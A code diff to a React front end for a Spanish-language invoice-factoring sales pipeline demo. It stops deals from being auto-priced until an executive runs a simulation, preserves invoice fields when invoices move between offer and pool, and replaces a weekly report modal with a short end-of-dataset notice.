-            return { ...d, stage: ns, time: nowStamp(), stale: false, status: STATUS_ETAPA[ns] || d.status, nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false, historialContacto: traza(d, `Avanzó a ${STATUS_ETAPA[ns] || ns}`, true, DET_ETAPA[ns]) };
+            return { ...d, stage: ns, time: nowStamp(), stale: false, status: STATUS_ETAPA[ns] || d.status, facturasDisponibles: undefined, nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false, historialContacto: traza(d, `Avanzó a ${STATUS_ETAPA[ns] || ns}`, true, DET_ETAPA[ns]) };
           }
           // Cesión externa: una parte de las operaciones en cesión se inscribe por otro factoring
           // (el cliente la cedió afuera). Se marca como sub-estado "Cesión externa" dentro de Aceptada.
@@ -16478,10 +19446,13 @@ export default function PipelineComercial() {
       const nid = `OP-R${nDia}${(d.id || "").replace(/[^0-9]/g, "").slice(-4)}`;
       reabiertas++;
       return { ...d, id: nid, reabiertaDe: d.id, stage: etapaNG, amountMM, facturas, deudores,
-        facturasOp: undefined, nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false, actualizando: false,
+        // Reabrir es originar de nuevo: vuelve SIN SIMULAR y con la oferta vacía. Antes se re-simulaba
+        // con `finanzasDe`, así que al día siguiente aparecían en el tubo con tasa y giro que nadie
+        // había calculado —y ese precio, además, nacía vencido.
+        facturasOp: [], simulado: false, tasaDescuento: undefined, comision: undefined, montoDescuentoMM: undefined,
+        nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false, actualizando: false,
         status: `Reabierta (día ${nDia}) · paquete actualizado`, time: nowStamp(), tProsp: Date.now(), subSeed: rndDet("seed|" + nid),
-        historialContacto: traza(d, `No gestionada al cierre del día ${nDia - 1}: se cierra y se reabre con el paquete vigente en la BD (${facturas} doc. · ${fmtMM(amountMM)})`),
-        ...finanzasDe(d.cliente, d.deudor, amountMM) };
+        historialContacto: traza(d, `No gestionada al cierre del día ${nDia - 1}: se cierra y se reabre con el paquete vigente en la BD (${facturas} doc. · ${fmtMM(amountMM)})`) };
     }));
     logSys("info", "cierre-dia", `Cierre del día ${nDia - 1}: ${reabiertas} oportunidad(es) no gestionada(s) en «${stageName(etapaNG)}» se cerraron y reabrieron con el paquete vigente`,
       { dia: nDia, reabiertas, etapaNoGestionada: etapaNG });
@@ -16520,8 +19491,7 @@ export default function PipelineComercial() {
     if (diaCerrado >= DIAS_SEMANA) {
       pausaRef.current = true;
       setStreaming(false);
-      setAnalisis(construirAnalisis());
-      setReporteModal(true);
+      setFinSetModal(true);
     } else {
       rolloverDia(diaCerrado + 1); // la simulación sigue corriendo (no se pausa)
     }
@@ -16529,38 +19499,6 @@ export default function PipelineComercial() {
   useEffect(() => {
     if (corridas > 0 && corridas % HORAS_DIA === 0) cerrarDiaRef.current();
   }, [corridas]);
-  // Análisis de fin de semana: empresas y reglas a incorporar + performance por regla.
-  const construirAnalisis = () => {
-    const perfiles = Object.entries(noClasRef.current.porPerfil)
-      .map(([perfil, v]) => ({ perfil, criterios: v.criterios, count: v.count, montoMM: v.montoMM, empresas: Object.values(v.empresas || {}).map((e) => ({ ...e, montoMM: +e.montoMM.toFixed(1) })).sort((a, b) => b.montoMM - a.montoMM) }))
-      .sort((a, b) => b.count - a.count).slice(0, 5);
-    const empresas = Object.entries(noClasRef.current.porCedente)
-      .map(([cedente, v]) => ({ cedente, ...v })).sort((a, b) => b.count - a.count).slice(0, 6);
-    const reglas = rules.map((r) => {
-      const st = reglaStatsRef.current[r.id] || { count: 0, montoMM: 0, empresas: {} };
-      return { id: r.id, title: r.title, activa: r.activa, accion: r.accion, count: st.count, montoMM: st.montoMM, empresas: Object.values(st.empresas || {}).map((e) => ({ ...e, montoMM: +e.montoMM.toFixed(1) })).sort((a, b) => b.montoMM - a.montoMM) };
-    }).sort((a, b) => b.count - a.count);
-    const ds = deudorStatsRef.current;
-    const deudores = { buenosFac: ds.buenos.fac, buenosMM: +ds.buenos.mm.toFixed(1), autorizadosFac: ds.autorizados.fac, autorizadosMM: +ds.autorizados.mm.toFixed(1), otrosFac: ds.otros.fac, otrosMM: +ds.otros.mm.toFixed(1), totalFac: ds.buenos.fac + ds.autorizados.fac + ds.otros.fac, totalMM: +(ds.buenos.mm + ds.autorizados.mm + ds.otros.mm).toFixed(1) };
-    return { perfiles, empresas, reglas, deudores, totalNoClas: noClasRef.current.total, montoNoClas: noClasRef.current.montoTotal, cobranza: construirCobranza() };
-  };
-  // Cobranza: lo que debe cada deudor (negocios cedidos/girados) por semana de vencimiento (1-8).
-  const construirCobranza = () => {
-    const cobranza = {};
-    deals.filter((d) => ["cesion", "giro"].includes(d.stage)).forEach((d) => {
-      const sem = Math.min(8, Math.max(1, Math.ceil((d.diasFin || 42) / 7)));
-      cobranza[d.deudor] = cobranza[d.deudor] || {};
-      cobranza[d.deudor][sem] = cobranza[d.deudor][sem] || { monto: 0, fac: 0 };
-      cobranza[d.deudor][sem].monto += d.amountMM;
-      cobranza[d.deudor][sem].fac += d.facturas || 0;
-    });
-    return cobranza;
-  };
-  const recomendarRegla = (criterios) => {
-    setReporteModal(false);
-    setEditingRule({ id: newRuleId(), title: "Regla recomendada (análisis)", unidad: "0 fact.", monto: "$0",
-      criterio: criterios, periodicidad: "Evento", nueva: "Cada ocurrencia", canales: ["Auto", "Facturas"], accion: "Pipeline Factoring", activa: true, _nuevo: true });
-  };
   // Muestreo continuo del conteo por etapa (ventana móvil que avanza con el tiempo).
   const dealsRef = useRef(deals);
   dealsRef.current = deals;
@@ -16594,19 +19532,20 @@ export default function PipelineComercial() {
     // Reinicio total: todo vuelve a cero para comenzar de nuevo.
     setStreaming(false); setStreamQueue(INBOUND_STREAM); setStreamFeed([]); setAcumulado([]); setRecibidas(0); setCorridas(0);
     setDeals([]); setHistoria([]);
-    setSelected(null); setDiaModal(null); setReporteModal(false); setReporteGestion(null); setCasosModal(null);
+    setSelected(null); setDiaModal(null); setFinSetModal(false); setReporteGestion(null); setCasosModal(null);
     noClasRef.current = { porPerfil: {}, porCedente: {}, total: 0, montoTotal: 0 }; reglaStatsRef.current = {}; deudorStatsRef.current = { buenos: { fac: 0, mm: 0 }, autorizados: { fac: 0, mm: 0 }, otros: { fac: 0, mm: 0 } };
-    setReporte([]); setAnalisis(null); setKpiHist([]); originadasRef.current = 0; originadasMontoRef.current = 0; originadasFacRef.current = 0; accDiaRef.current = nuevoAcc(); pausaRef.current = false; iniciadoRef.current = false;
+    setReporte([]); setKpiHist([]); originadasRef.current = 0; originadasMontoRef.current = 0; originadasFacRef.current = 0; accDiaRef.current = nuevoAcc(); pausaRef.current = false; iniciadoRef.current = false;
   };
 
-  // Negocio asignado manualmente desde la bandeja (también se simula).
+  // Negocio asignado manualmente desde la bandeja. Como cualquier oportunidad nueva, NO se simula:
+  // sus facturas entran al pool disponible y el ejecutivo arma la oferta en el detalle.
   const dealManual = (ev, execIni) => ({
     id: ev.opId, stage: "prospeccion", tag: ev.tag, facturas: ev.nFacturas || 1, amountMM: ev.monto || 0,
     cliente: ev.cedente, deudor: ev.pagador, deudores: [{ name: ev.pagador, facturas: ev.nFacturas || 1, montoMM: ev.monto || 0 }], sector: ev.sector, tasa: ev.tasa, anticipo: ev.anticipo, esCliente: ev.esCliente,
-    rutEmisor: ev.rutEmisor, cat: ev.cat, catLabel: ev.cat, pctBlanca: ev.pctBlanca, sowTendencia: ev.sowTendencia, sowFlecha: ev.sowFlecha, sowActualPct: ev.sowActualPct, sowTargetPct: ev.sowTargetPct, sowGapPct: ev.sowGapPct, superaTarget: ev.superaTarget, conDescuento: ev.conDescuento, spreadPromo: ev.spreadPromo, facturasOp: ev.facturasOp,
+    rutEmisor: ev.rutEmisor, cat: ev.cat, catLabel: ev.cat, pctBlanca: ev.pctBlanca, sowTendencia: ev.sowTendencia, sowFlecha: ev.sowFlecha, sowActualPct: ev.sowActualPct, sowTargetPct: ev.sowTargetPct, sowGapPct: ev.sowGapPct, superaTarget: ev.superaTarget, conDescuento: ev.conDescuento, spreadPromo: ev.spreadPromo, facturasOp: [], facturasDisponibles: ev.facturasOp,
     status: "Asignada por admin", time: nowStamp(), channel: "Manual", exec: execIni || asignarEjecutivo(ev),
     stale: false, important: (ev.monto || 0) > 800, _inbound: true, perdedor: rndDetBool(`perd|${ev.cedente}|${ev.pagador}`, 0.195), subSeed: rndDet(`seed|${ev.cedente}|${ev.pagador}`), nuevasFacturas: 0, nuevasFacturasMontoMM: 0, warning: false, tProsp: Date.now(),
-    ...finanzasDe(ev.cedente, ev.pagador, ev.monto || 0),
+    simulado: false,
   });
   const asignarManual = (ev, execIni) => {
     const nd = dealManual(ev, execIni);
@@ -16757,7 +19696,15 @@ export default function PipelineComercial() {
       if (d.id !== id) return d;
       const base = itemizarFacturas(d);
       // Preservar el tipo de deudor de cada factura agregada (las "Otro" disparan Otorgamiento).
-      const nuevasOp = [...base, ...facs.map((f) => ({ id: f.id, folio: f.folio, tipo: f.tipo, deudor: f.deudor, montoMM: f.montoMM, venc: f.venc, tipoDeudor: f.tipoDeudor || tipoDeudor(f.rutRecep, f.deudor), inboundBucket: f.inboundBucket, rutRecep: f.rutRecep, enlaceXml: f.enlaceXml, enlacePdf: f.enlacePdf, sinXml: f.sinXml != null ? f.sinXml : true }))];
+      const nuevasOp = [...base, ...facs.map((f) => {
+        // Se hereda la factura COMPLETA y sólo se sacan las marcas del pool de candidatas. Reconstruirla
+        // campo por campo perdía `histFactoring`, que es de donde tipoDeudorDisp() saca «Histórico BICE».
+        const { candidata, otro, porCupo, _ncAplicada, ...limpio } = f;
+        return { ...limpio,
+          tipoDeudor: f.tipoDeudor || tipoDeudor(f.rutRecep, f.deudor),
+          histFactoring: f.histFactoring != null ? f.histFactoring : null,
+          sinXml: f.sinXml != null ? f.sinXml : true };
+      })];
       const addMonto = +facs.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1);
       const agregoOtro = facs.some((f) => f.otro || (f.tipoDeudor || tipoDeudor(f.rutRecep, f.deudor)) === "Otro");
       // Las facturas agregadas que venían de "disponibles" (Otro) salen del pool de disponibles.
@@ -16782,6 +19729,63 @@ export default function PipelineComercial() {
     setDeals((prev) => prev.map(upd));
     setSelected((s) => (s ? upd(s) : s));
   };
+  // Aplica la SUGERENCIA de apertura: reparte el pool entre oferta y disponibles según lo propuesto.
+  // No simula —no toca tasa, giro ni descuentos—: deja una selección de partida y nada más. La lista
+  // de `deudores` no se toca: es la de la OPORTUNIDAD (todo lo que el cliente tiene), y el tubo la usa
+  // para las compuertas; los deudores de la OFERTA salen de `facturasOp`.
+  const aplicarSugerencia = (id, facs) => {
+    const ids = new Set((facs || []).map((f) => f.id));
+    const upd = (d) => {
+      if (d.id !== id) return d;
+      const vistos = new Set(); const pool = [];
+      [...(d.facturasOp || []), ...(d.facturasDisponibles || [])].forEach((f) => {
+        if (!f || f.id == null || vistos.has(f.id)) return;
+        vistos.add(f.id); pool.push(f);
+      });
+      const limpiar = (f) => {
+        const { candidata, otro, porCupo, _ncAplicada, ...limpio } = f;
+        return { ...limpio,
+          tipoDeudor: f.tipoDeudor || tipoDeudor(f.rutRecep, f.deudor),
+          histFactoring: f.histFactoring != null ? f.histFactoring : null,
+          sinXml: f.sinXml != null ? f.sinXml : true };
+      };
+      // La seleccion viaja COMPLETA en `facs`: el selector la arma sobre lo que la pantalla muestra,
+      // que incluye las facturas del LIBRO del cliente —sintetizadas en el render por
+      // `candidatasLibro` y ausentes de `facturasDisponibles`—. Intersectando contra el pool guardado
+      // se caian justamente esas y la oferta terminaba con muchas menos facturas de las que la opcion
+      // prometia (88 ofrecidas, 27 incorporadas). Se incorporan tal cual, como hace «Ajustar facturas».
+      const dentro = (facs || []).filter((f) => f && f.id != null).map(limpiar);
+      const fuera = pool.filter((f) => !ids.has(f.id));
+      return { ...d, ofertaSugerida: true,
+        facturasOp: dentro.length ? dentro : d.facturasOp,
+        facturasDisponibles: fuera.length ? fuera : undefined,
+        facturas: dentro.length || d.facturas,
+        amountMM: dentro.length ? +dentro.reduce((s2, f) => s2 + (f.montoMM || 0), 0).toFixed(1) : d.amountMM };
+    };
+    setDeals((prev) => prev.map(upd));
+    setSelected((s) => (s ? upd(s) : s));
+  };
+  // SIMULAR: es lo ÚNICO que calcula condiciones comerciales, y sólo cuando el ejecutivo lo pide sobre
+  // la selección que dejó. Hasta acá la oportunidad tiene deudores y montos, pero no precio.
+  const simularOferta = (id) => {
+    let patch = null;
+    const upd = (d) => {
+      if (d.id !== id) return d;
+      const fs = itemizarFacturas(d);
+      const monto = +fs.reduce((s2, f) => s2 + (f.montoMM || 0), 0).toFixed(1);
+      patch = { simulado: true, amountMM: monto, facturas: fs.length, status: "Simulada",
+        facturasOp: d.facturasOp, facturasDisponibles: d.facturasDisponibles, ofertaSugerida: d.ofertaSugerida,
+        ...finanzasDe(d.cliente, d.deudor, monto) };
+      return { ...d, ...patch, historialContacto: traza(d, `Simulación de la oferta: ${fs.length} factura(s) por ${fmtMM(monto)}`) };
+    };
+    setDeals((prev) => prev.map(upd));
+    setSelected((s) => (s ? upd(s) : s));
+    // El detalle vive en una PESTAÑA APARTE —se abre con `window.open` y un ticket con la foto del
+    // negocio—, así que su estado no es el del tubo: sin avisar, la operación quedaba simulada acá y
+    // «Sin simular» allá para siempre. Se le notifica a la ventana que lo abrió, por el mismo canal
+    // con que el sitio del cliente informa el cierre remoto.
+    try { if (patch && window.opener) window.opener.postMessage({ type: "nex-simulado", dealId: id, patch }, ORIGEN_APP); } catch (e) {}
+  };
   // Retira una factura de la oferta y la deja disponible como candidata en "Otras facturas".
   const retirarFacturaOferta = (id, fac) => {
     if (!fac) return;
@@ -16797,7 +19801,12 @@ export default function PipelineComercial() {
       const dd = deudores.find((x) => x.name === fac.deudor);
       if (dd) { dd.facturas = Math.max(0, (dd.facturas || 0) - 1); dd.montoMM = +Math.max(0, (dd.montoMM || 0) - quitMonto).toFixed(1); }
       const deudoresF = deudores.filter((x) => (x.facturas || 0) > 0);
-      const retirada = { id: fac.id, folio: fac.folio, tipo: fac.tipo, deudor: fac.deudor, montoMM: fac.montoMM, venc: fac.venc, tipoDeudor: fac.tipoDeudor, otro: fac.otro };
+      // Simétrico con incorporarFacturasOferta: se hereda la factura COMPLETA y sólo se quitan las
+      // marcas del pool de candidatas. Enumerar campos a mano perdía `histFactoring` (la degradaba a
+      // «Otro»), pero también `sinXml` (volvía marcada como sin XML aunque conservara su enlace, y caía
+      // en el gate «Solicitar XML» que bloquea ceder), y `reclamada`/`notaCredito` — o sea que retirar
+      // y volver a agregar BLANQUEABA una factura reclamada y la dejaba pasar a cesión.
+      const { candidata: _c, porCupo: _pc, _ncAplicada: _nc, ...retirada } = fac;
       const restRet = [...(d.facturasRetiradas || []).filter((f) => f.id !== fac.id), retirada];
       const tasaDescuento = d.tasaDescuento || 1.5;
       const fin = calcularFinanzas(d.cliente, d.deudor, amountMM, tasaDescuento, d.comision || 200000);
@@ -16933,8 +19942,10 @@ export default function PipelineComercial() {
         .dp-detalle .t9{font-size:13.5px;line-height:1.4}.dp-detalle .t10{font-size:14px;line-height:1.4}.dp-detalle .t11{font-size:15px;line-height:1.45}.dp-detalle .t12{font-size:15px}
         /* Última fila sin divisor inferior: evita la doble línea contra el borde del contenedor de la tabla */
         tbody tr:last-child{border-bottom:0 !important} tbody tr:last-child>td{border-bottom:0 !important}
-        .skel{position:relative;overflow:hidden;background:#F3F4F6;border-radius:8px}
-        .skel::after{content:"";position:absolute;inset:0;transform:translateX(-100%);background:linear-gradient(90deg,transparent,rgba(255,255,255,.7),transparent);animation:skel 1.1s infinite}
+        /* El gris del esqueleto es el de los bordes (C.line): con #F3F4F6 apenas se despegaba del blanco
+           de la tarjeta y el placeholder no se leía como "acá va a llegar un dato". */
+        .skel{position:relative;overflow:hidden;background:#E5E7EB;border-radius:8px}
+        .skel::after{content:"";position:absolute;inset:0;transform:translateX(-100%);background:linear-gradient(90deg,transparent,rgba(255,255,255,.85),transparent);animation:skel 1.1s infinite}
         @keyframes skel{100%{transform:translateX(100%)}}
         .pl-spin{animation:pl-spin .8s linear infinite;transform-origin:50% 50%}@keyframes pl-spin{to{transform:rotate(360deg)}}
         .bgw50{background-color:rgba(255,255,255,0.5)}
@@ -16977,7 +19988,7 @@ export default function PipelineComercial() {
               detalle (cliente · id · etapa, selector de usuario y avatar), de modo que la pantalla abría
               con la identidad y el selector DUPLICADOS. La cabecera del propio detalle es la única. */}
           <div className="mx-auto w-full" style={{ maxWidth: 1600 }}>
-            <DealDrawer key={selected.id} deal={selected} fullPage onClose={() => window.close()} onAdvance={advance} onReject={reject} onIncorporar={abrirIncorporar} onIncorporarFacturas={incorporarFacturasOferta} onRetirarFactura={retirarFacturaOferta} onPublicar={publicarOferta} onCerrarOferta={cerrarOferta} onEnviarCierre={enviarCierre} onContactar={iniciarContacto} onEditarContacto={editarContacto} onEnviarWA={enviarWA} onMover={moverEtapa} cierre={cierreModal} onConfirmCierre={confirmarCierre} usuario={usuario} onAutorizarCausa={autorizarCausa} onOtorgarOperacion={otorgarOperacion} tabInicial={(detallePayload && detallePayload.tab) || dealTabInicial} onIrOtorgamientos={() => {}} />
+            <DealDrawer key={selected.id} deal={selected} fullPage onClose={() => window.close()} onAdvance={advance} onReject={reject} onIncorporar={abrirIncorporar} onIncorporarFacturas={incorporarFacturasOferta} onRetirarFactura={retirarFacturaOferta} onSugerirOferta={aplicarSugerencia} onSimular={simularOferta} onPublicar={publicarOferta} onCerrarOferta={cerrarOferta} onEnviarCierre={enviarCierre} onContactar={iniciarContacto} onEditarContacto={editarContacto} onEnviarWA={enviarWA} onMover={moverEtapa} cierre={cierreModal} onConfirmCierre={confirmarCierre} usuario={usuario} onCambiarUsuario={setUsuario} onAutorizarCausa={autorizarCausa} onOtorgarOperacion={otorgarOperacion} tabInicial={(detallePayload && detallePayload.tab) || dealTabInicial} onIrOtorgamientos={() => {}} />
           </div>
         </div>
       )) : (<>
@@ -17009,7 +20020,7 @@ export default function PipelineComercial() {
           {(() => { const n = notifSolic(usuario, deals).total; return (
             <button onClick={() => setSolicOpen(true)} title="Requerimientos de información" style={{ position: "relative", lineHeight: 0 }}>
               <Bell size={18} style={{ color: n ? C.indigo : C.sub }} />
-              {n > 0 && <span className="flex h-4 minw5 items-center justify-center rounded-full px-1 t9 font-bold text-white" style={{ position: "absolute", top: -6, right: -6, backgroundColor: "#ef4444" }}>{n}</span>}
+              {n > 0 && <span className="flex h-4 minw5 items-center justify-center rounded-full px-1 t9 font-bold text-white" style={{ position: "absolute", top: -6, right: -6, backgroundColor: "#EF4444" }}>{n}</span>}
             </button>
           ); })()}
           {(() => { const nP = deals.filter(dealVisible).filter((d) => tienePrioridadCurse(d.id)).length; return (
@@ -17059,13 +20070,16 @@ export default function PipelineComercial() {
               <h1 className="text-2xl font-semibold tracking-tight">Te damos la bienvenida, {(soloExec || (USERS[usuario] || "").split(" · ")[0] || "").split(" ")[0] || "equipo"}</h1>
               <span className="rounded-full px-3 py-1 t11 font-semibold" style={{ backgroundColor: "#F1ECFF", color: "#703EFF" }}>{soloExec || "Todos los ejecutivos"}</span>
             </div>
-            <DashboardView usuario={usuario} deals={deals} onVerPrioritarios={() => { setVista("tabla"); setQuickFilter("prioritarios"); irA("pipeline", "Tubo diario"); }} />
+            <DashboardView usuario={usuario} deals={deals}
+              onVerClientes={(f) => { irA("clientes", "Clientes"); setSelClientes({ f, n: Date.now() }); }}
+              onVerTareas={(tipo) => { irA("tareas", "Tareas"); setSelTareas({ tipo, n: Date.now() }); if (tipo === "mensajes") setSolicOpen(true); }}
+              onVerChurn={() => { setReporteGestion("churn"); irA("panel", "Gestión"); }} />
           </>
         ) : vistaApp === "clientes" ? (
           <>
             <div className="flex items-center gap-1 t11" style={{ color: C.faint }}>Comercial <ChevronRight size={12} /> Clientes</div>
             <h1 className="mt-1 mb-4 text-2xl font-semibold tracking-tight">Empresas</h1>
-            <ClientesView soloExec={soloExec} />
+            <ClientesView soloExec={soloExec} sel={selClientes} />
           </>
         ) : vistaApp === "panel" ? (
           <>
@@ -17089,6 +20103,10 @@ export default function PipelineComercial() {
                   <div className="rounded-2xl bg-white p-5" style={{ border: `1px solid ${C.line}`, boxShadow: "0 4px 16px rgba(20,25,45,.05)" }}>
                     <ReportePerformance inline usuario={usuario} onClose={() => setReporteGestion(null)} />
                   </div>
+                ) : reporteGestion === "churn" ? (
+                  <div className="rounded-2xl bg-white p-5" style={{ border: `1px solid ${C.line}`, boxShadow: "0 4px 16px rgba(20,25,45,.05)" }}>
+                    <ReporteChurn soloExec={soloExec} />
+                  </div>
                 ) : reporteGestion === "benchEjec" ? (
                   <ComparativoModal inline deals={dealsF} onClose={() => setReporteGestion(null)} />
                 ) : reporteGestion === "benchDeudores" ? (
@@ -17100,7 +20118,7 @@ export default function PipelineComercial() {
           <>
             <div className="flex items-center gap-1 t11" style={{ color: C.faint }}>Comercial <ChevronRight size={12} /> Tareas</div>
             <h1 className="mt-1 mb-4 text-2xl font-semibold tracking-tight">Tareas comerciales</h1>
-            <TareasView deals={misExecs === null ? deals : deals.filter(dealVisible)} onOpen={abrirDetalle} soloExec={soloExec} esJefe={esJefeComercial(usuario)} usuarioNombre={USERS[usuario]} usuario={usuario} onOpenSolic={() => setSolicOpen(true)} onIrLineas={() => irA("lineas", "Líneas")} plan={planMensual} setPlan={setPlanMensual} />
+            <TareasView deals={misExecs === null ? deals : deals.filter(dealVisible)} onOpen={abrirDetalle} soloExec={soloExec} esJefe={esJefeComercial(usuario)} usuarioNombre={USERS[usuario]} usuario={usuario} onOpenSolic={() => setSolicOpen(true)} onIrLineas={() => irA("lineas", "Líneas")} selTipo={selTareas} plan={planMensual} setPlan={setPlanMensual} />
           </>
         ) : vistaApp === "operaciones" ? (
           <>
@@ -17194,10 +20212,10 @@ export default function PipelineComercial() {
             { id: "pipeline", cards: [
               { id: "oport", label: "OPORTUNIDADES", value: activeCount.toLocaleString("es-CL"), sub: "",
                 side: [{ text: "Fluido", up: true, dot: true, hint: "Estado del pipeline" }, ...(() => { const n = deals.filter((d) => d.stage === "prospeccion" && d.stale).length; return n > 0 ? [{ text: n + (n === 1 ? " estancada" : " estancadas"), up: false, hint: "Oportunidades estancadas en prospección" }] : []; })()],
-                serie: kpiHist.map((h) => h.oport) },
-              { id: "piptotal", label: "PIPELINE TOTAL", value: fmtMM(totalPipeline), sub: "", serie: kpiHist.map((h) => h.pipeline),
+                mini: serieOport, miniHint: "Evolución del número de oportunidades abiertas" },
+              { id: "piptotal", label: "PIPELINE TOTAL", value: fmtMM(totalPipeline), sub: "", mini: kpiHist.map((h) => h.pipeline), miniHint: "Pipeline total al cierre de cada día",
                 side: [{ label: "WR", v: `${winLoss.win}%`, n: winLoss.ganados, up: true, hint: `${winLoss.ganados} ganados` }, { label: "LR", v: `${winLoss.loss}%`, n: winLoss.perdidos, up: false, hint: `${winLoss.perdidos} perdidos` }] },
-              { id: "venta", label: "VENTA MENSUAL", value: fmtMM(ventaMensualMM), budget: fmtMM(BUDGET_MES_MM), pct: vsBudget, sub: "", serie: kpiHist.map((h) => h.venta) },
+              { id: "venta", label: "VENTA MENSUAL", value: fmtMM(ventaMensualMM), budget: fmtMM(BUDGET_MES_MM), pct: vsBudget, sub: "", mini: kpiHist.map((h) => h.venta), miniHint: "Venta mensual al cierre de cada día" },
             ] },
           ];
           const tile = (k) => {
@@ -17212,19 +20230,26 @@ export default function PipelineComercial() {
                     {k.budget != null && <span className="t11 font-medium" style={{ color: C.faint }}>/ {k.budget}</span>}
                     {k.pct != null && <span className="t10 font-bold" title="Cumplimiento vs budget del mes" style={{ color: C.indigo }}>({k.pct}%)</span>}
                   </div>
-                  {k.side && (
-                    <div className="flex shrink-0 flex-wrap items-center justify-end gap-1">
-                      {k.side.map((s) => (
-                        <span key={s.label || s.text} title={s.hint} className="flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: s.up ? C.greenBg : C.amberBg, color: s.up ? C.green : C.red }}>
-                          {s.dot && <span className="h-1.5 w-1.5 rounded-full" style={{ backgroundColor: s.up ? C.green : C.red }} />}
-                          {s.text != null ? s.text : `${s.label} ${s.v} · ${s.n}`}
-                        </span>
-                      ))}
+                  {(k.side || k.mini) && (
+                    <div className="flex shrink-0 flex-col items-end gap-1">
+                      {k.side && (
+                        <div className="flex flex-wrap items-center justify-end gap-1">
+                          {k.side.map((s) => (
+                            <span key={s.label || s.text} title={s.hint} className="flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: s.up ? C.greenBg : C.amberBg, color: s.up ? C.green : C.red }}>
+                              {s.dot && <span className="h-1.5 w-1.5 rounded-full" style={{ backgroundColor: s.up ? C.green : C.red }} />}
+                              {s.text != null ? s.text : `${s.label} ${s.v} · ${s.n}`}
+                            </span>
+                          ))}
+                        </div>
+                      )}
+                      {/* Mini gráfico del pulso del tubo, a la derecha del valor. */}
+                      {k.mini && k.mini.length > 1 && (
+                        <div title={k.miniHint} style={{ width: 132 }}><Sparkline data={k.mini} color={C.indigo} ranuras={10} alto="h-5" /></div>
+                      )}
                     </div>
                   )}
                 </div>
                 {k.sub && <div className="t9 truncate" style={{ color: C.faint }}>{k.sub}</div>}
-                {k.serie && k.serie.length > 1 && <div className="mt-1"><Sparkline data={k.serie} color={C.indigo} /></div>}
               </div>
             );
           };
@@ -17346,7 +20371,22 @@ export default function PipelineComercial() {
           casos={casosDe(casosModal)} onClose={() => setCasosModal(null)} onExport={() => exportarCasos(casosModal)} />
       )}
       {/* El modal de "Día X cerrado" se eliminó: el cierre de día es automático (ver cerrarDiaRef). */}
-      {reporteModal && <ReporteModal reporte={reporte} analisis={analisis} onClose={() => setReporteModal(false)} onRecomendar={recomendarRegla} />}
+      {/* Fin del set de datos de prueba. Antes acá se abría un reporte semanal completo, que en una demo
+          interrumpía el recorrido justo cuando el tubo ya tenía datos para mostrar. Ahora sólo avisa. */}
+      {finSetModal && (<>
+        <div className="fixed inset-0 z-40 ovl" onClick={() => setFinSetModal(false)} />
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-4" onClick={() => setFinSetModal(false)}>
+          <div onClick={(e) => e.stopPropagation()} className="w-full max-w-sm rounded-2xl bg-white p-5 text-center shadow-2xl" style={{ border: `1px solid ${C.line}` }}>
+            <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full" style={{ backgroundColor: C.greenBg, border: "1px solid #bbf7d0" }}><Check size={22} style={{ color: C.green }} /></div>
+            <div className="mt-3 text-lg font-bold" style={{ color: C.ink }}>El set de datos de prueba finalizó</div>
+            <div className="mt-1 t12" style={{ color: C.sub }}>La simulación procesó los {DIAS_SEMANA} días del set y se detuvo. Puedes seguir navegando el tubo con los datos generados, o reiniciar para partir de cero.</div>
+            <div className="mt-4 flex justify-center gap-2">
+              <button onClick={() => setFinSetModal(false)} className="rounded-full px-4 py-2 t12 font-semibold" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>Cerrar</button>
+              <button onClick={() => { setFinSetModal(false); resetStream(); }} className="rounded-full px-4 py-2 t12 font-semibold text-white" style={{ backgroundColor: C.indigo }}>Reiniciar</button>
+            </div>
+          </div>
+        </div>
+      </>)}
       {wizardOpen && <NuevoNegocioWizard usuario={esAdmin ? USUARIO : usuario} deal={wizardDeal} deals={deals} onOpenDeal={(d) => { setWizardOpen(false); setWizardDeal(null); abrirDetalle(d); }} onClose={() => { setWizardOpen(false); setWizardDeal(null); }} onConfirm={crearNegocioWizard} />}
       {filtrosAvOpen && (
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4" style={{ backgroundColor: "rgba(17,24,39,.45)" }} onClick={() => setFiltrosAvOpen(false)}>
